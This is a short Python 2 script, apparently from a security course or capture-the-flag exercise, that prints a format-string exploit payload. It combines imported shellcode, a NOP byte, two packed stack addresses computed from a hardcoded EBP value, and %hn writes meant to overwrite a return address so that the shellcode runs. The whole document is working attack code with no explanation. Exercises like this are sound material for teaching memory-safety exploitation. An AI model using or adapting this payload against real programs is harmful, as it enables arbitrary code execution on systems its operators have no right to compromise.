from shellcode import shellcode
from struct import pack

ebp = 0xbffe99f8
print shellcode+ "\x90" + pack("<I",ebp+6) + pack("<I",ebp+4) + "%49118x%10$hn%119282x%11$hn"



